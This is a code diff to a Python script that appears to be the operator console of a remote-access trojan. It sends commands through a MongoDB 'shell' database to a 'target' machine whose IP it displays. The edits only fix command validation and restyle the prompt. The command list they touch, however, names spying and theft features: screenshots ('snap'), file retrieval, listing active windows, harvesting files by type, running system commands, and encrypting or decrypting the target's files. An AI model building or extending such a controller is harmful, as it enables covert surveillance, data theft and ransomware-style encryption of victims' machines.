@@ -3,7 +3,7 @@ import json
 from PIL import Image as im
 import numpy as np
 import requests
-from colorama import Fore,init
+from colorama import Fore,init,Style
 import os
 import socket
 import gridfs
@@ -22,7 +22,7 @@ db=client['shell']
 
 fs=gridfs.GridFS(db)
 
-MY_COMMANDS=['dir','cd','cd..','deletefile','createfile','snap','renamefile','getfile','showimg','mkdir','rmdir','activewindows','getfilesize','updatefile','disks','encrypt','decrypt','targetinfo','getalltypefiles','refreshserver','system']
+MY_COMMANDS=['exit','e','quit','q','commands','dir','cd','cd..','deletefile','createfile','snap','renamefile','getfile','showimg','mkdir','rmdir','activewindows','getfilesize','updatefile','disks','encrypt','decrypt','targetinfo','getalltypefiles','refreshserver','system']
 
 CWD=r""
 LAST_PATH=""
@@ -259,7 +259,7 @@ def ActionUploader():
     col=db['myshell']
     clearCollection()
 
-    if ((a[0] not in (MY_COMMANDS and ['exit','e','quit','q','commands']))):
+    if ((a[0] not in (MY_COMMANDS))):
         print(Fore.CYAN+">>> ")
         print("invalid command")
         return
@@ -557,9 +557,10 @@ def shell():
     getTargetMachine()
     while True:
         internet=has_active_internet()
-        struct0=(Fore.LIGHTYELLOW_EX+CWD)
-        struct1=(Fore.LIGHTGREEN_EX+f"(target@{TARGET})-->IP: {IP}-[{struct0}]\n")
-        struct2=(Fore.CYAN+"$ ")
+        struct0=(Fore.LIGHTYELLOW_EX+f"~\{CWD}")
+        struct00=(Fore.MAGENTA+Style.BRIGHT+f"{IP}")
+        struct1=(Fore.CYAN+Style.BRIGHT+f"target@{TARGET} {struct00} {struct0}\n")
+        struct2=(Fore.MAGENTA+Style.BRIGHT+"$ ")
         shell_struct=struct1+struct2
         command=str(input(shell_struct))
         if internet:
